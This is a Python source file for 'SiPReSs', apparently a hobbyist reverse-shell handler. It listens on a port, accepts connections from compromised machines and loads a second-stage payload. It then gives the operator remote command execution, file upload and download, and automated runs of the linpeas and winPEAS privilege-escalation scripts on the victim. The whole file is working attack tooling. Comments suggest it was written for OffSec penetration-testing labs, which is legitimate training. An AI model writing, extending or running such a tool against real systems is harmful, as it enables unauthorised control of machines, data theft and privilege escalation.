import base64
from hashlib import md5
import socket
import sys
import threading
import time

from _pyrepl.console import InteractiveColoredConsole
from _pyrepl.simple_interact import run_multiline_interactive_console



# set sys.{ps1,ps2} just before invoking the interactive interpreter. This
# mimics what CPython does in pythonrun.c

class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
    def __init__(self, ip, port=42069):
        super().__init__(filename="REMOTE")
        self.keep_reading = True
        self.ip = ip
        self.port = port
        self.socket = socket.socket()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("", port))
        self.socket.listen()
        self.welcome()
        print(f"Waiting for connection on {port}")
        self.await_connection()

    def await_connection(self):
        self.connection, remote = self.socket.accept()
        print(f"Connection from {remote}")
        self.stdin = self.connection.makefile("w")
        self.stdout = self.connection.makefile("rb")
        print("Loading second stage")
        self.run_code_line("&run reverse_shell/reverse_shell_second_stage.py")
        self.socket_reader = threading.Thread(target=self.reader_thread_function)
        self.socket_reader.start()

    def reader_thread_function(self):
        #weird double loop for sleep (eventually)
        while self.keep_reading:
            while self.keep_reading:
                data = self.stdout.readline()
                if data == b"\x04\n" or data == b"\x04\r\n": break
                if data.decode(): print(data.decode(), end="\r")

    def remote_os_system_call(self,source):
        source = source.replace('"', '\\"')
        return f"os.system(\"\"\"{source[1:]}\"\"\")"

    def run_shell_script_on_remote(self, file_path):
        with open(file_path) as f:
            for i, line in enumerate(f.readlines()):
                if not line or line == b"\n":
                    continue # skip empty lines
                shell_script = line.replace("\\", "\\\\").replace('"', '\\"').replace('\\\\\\"', '\\\\"') # kekw replace sucks
                shell_script = shell_script.lstrip() # remove spaces because indentation doesnt matter
                source = f'run_shell_command("""{shell_script}""")'
                self.runsource(source, None, None)

    def special_command(self, source, filename, symbol):
        if source == "exit" or source == "quit":
            exit()
        elif source.startswith("uploadsliced"):
            #upload sliced for bad machines like offsec trash
            _, local_file, remote_file = source.split(" ")
            return self.upload_file_sliced(local_file, remote_file)
        elif source.startswith("upload"):
            #upload
            _, local_file, remote_file = source.split(" ")
            return self.upload_file(local_file, remote_file)
        elif source.startswith("download"):
            #download
            _, remote_file, local_file = source.split(" ")
            self.download_file(remote_file, local_file)
        elif source.startswith("run"):
            #run local file on remote
            _, local_file = source.split(" ")
            with open(local_file) as f:
                new_source = f.read()
            return new_source
        elif source.startswith("localrun"):
            #run local file
            _, local_file = source.split(" ")
            with open(local_file) as f:
                new_source = f.read()
            self.runsource_locally(new_source, filename, symbol)
        elif source.startswith("shellrun"):
            #run local file on remote
            _, local_file = source.split(" ")
            self.run_shell_script_on_remote(local_file)
        elif source.startswith("linpeas"):
            local_file = "/usr/share/peass/linpeas/linpeas.sh"
            self.run_shell_script_on_remote(local_file)
        elif source.startswith("winpeas"):
            local_file = "/usr/share/peass/winpeas/winPEAS.ps1"
            self.run_shell_script_on_remote(local_file)


    def upload_file(self, local_file, remote_file):
        with open(local_file, "rb") as f:
            content = f.read()
        hashed = md5(content).hexdigest()
        content = base64.b64encode(content)
        source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'wb') as f:\n\tcontent=base64.b64decode({content})\n\tf.write(content)\n\tprint(md5(content).hexdigest()=='{hashed}')"""
        return source

    def upload_file_sliced(self,local_file, remote_file, step_override=None):
        with open(local_file, "rb") as f:
            content = f.read()
        hashed = md5(content).hexdigest()
        touch = f"""with open('{remote_file}', 'w') as f:\n\tpass\n"""
        self.runsource(touch, None, None)
        slice_size = max(len(content)//2000, 1) if step_override is None else step_override
        for i in range(0,len(content), slice_size):
            slice = content[i:i+slice_size]
            slice = base64.b64encode(slice)
            source = f"""import base64\nwith open('{remote_file}', 'ab+') as f:\n\tcontent=base64.b64decode({slice})\n\tf.write(content)"""
            self.runsource(source, None, None)
            print(f"uploading slice {i}/{len(content)}")
        return f"from hashlib import md5\nwith open('{remote_file}', 'rb') as f:\n\tprint(md5(f.read()).hexdigest()=='{hashed}')"


    def download_file(self, remote_file, local_file):
        source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'rb') as f:\n\tcontent=base64.b64encode(f.read())\n\tprint(content.decode())"""
        self.stdin.write(source)
        self.stdin.write("\n\x04\n")
        self.stdin.flush()
        based_data = b""
        while self.stdout.peek():
            data = self.stdout.readline()
            if data == b"\x04\n" or data == b"\x04\r\n": break
            based_data+=data
        based_data = based_data.strip()
        data = base64.b64decode(based_data)
        with open(local_file, "wb") as f:
            f.write(data)

    def might_be_import(self, source):
        keywords = source.startswith("import") or (source.startswith("from") and "import" in source)
        only_one_statement = len(source.strip().split("\n")) < 2
        return keywords and only_one_statement

    def run_code_line(self, line):
        #run a line as if it was typed in the cli
        self.runsource(line, None, None)

    def runsource(self, source, filename, symbol):
        self._runsource(source, filename, symbol)


    def _runsource(self, source, filename=None, symbol=None):
        if source.startswith("$"):
            source = self.remote_os_system_call(source)
        elif source.startswith("%"):
            self.runsource_locally(source[1:], filename, symbol)
            return
        elif source.startswith("&"):
            source = self.special_command(source[1:], filename, symbol)
            if not source: return
        elif self.might_be_import(source):
            self.runsource_locally(source, filename, symbol)
        self.stdin.write(source)
        self.stdin.write("\n\x04\n")
        self.stdin.flush()

    def runsource_locally(self, source, filename, symbol):
        super().runsource(source, filename, symbol)

    def welcome(self):
        print("=" * 35)
        print("SiPReSs")
        print("Silly Python Reverse Shell by dotpy")
        print("="*35)
        print("This is a full remote python interpreter")
        print("If you get stuck try ctrl-c")
        print("CTRL-D or &exit or &quit TO EXIT - this should also kill the remote interpreter (eventually)")
        print("=" * 35)
        print("use $ to run os.system on the remote interpreter")
        print("try: $whoami")
        print("use % to use the LOCAL interpreter")
        print("try: %os.system('id')")
        print("use & for special commands")
        print("&exit to exit")
        print("&upload <local> <remote> to upload")
        print("&uploadsliced <local> <remote> to upload in small slices.. this is slow and only for emergencies on offsec trash boxes")
        print("&download <remote> <local> to download")

        print("&run <file> to run a local python file on remote")
        print("&localrun <file> to run a local python file locally")
        print("&shellrun <file> to run a local shell file on the remote shell (powershell or bash)")
        print("&linpeas run linpeas from the default kali path (/usr/share/peass/linpeas/linpeas.sh)")
        print("&winpeas run winpeas from the default kali path (/usr/share/peass/winpeas/winPEAS.ps1)")
        print("&interactive drop into an interactive system shell")
        print("=" * 35)
        print("")


    def kill_remote(self):
        print("Trying to kill remote shell - if this doesnt work it will die eventually from socket errors")
        self.runsource("import sys\ninteractive_shell.kill()\nsys.exit()", None, None)

def reverse_shell_handler(local_ip, local_port):
    if not hasattr(sys, "ps1"):
        sys.ps1 = ">>> "
    if not hasattr(sys, "ps2"):
        sys.ps2 = "... "

    console = RemoteInteractiveColoredConsole(local_ip, local_port)
    try:
        run_multiline_interactive_console(console)
    finally:
        console.keep_reading = False
        console.kill_remote()

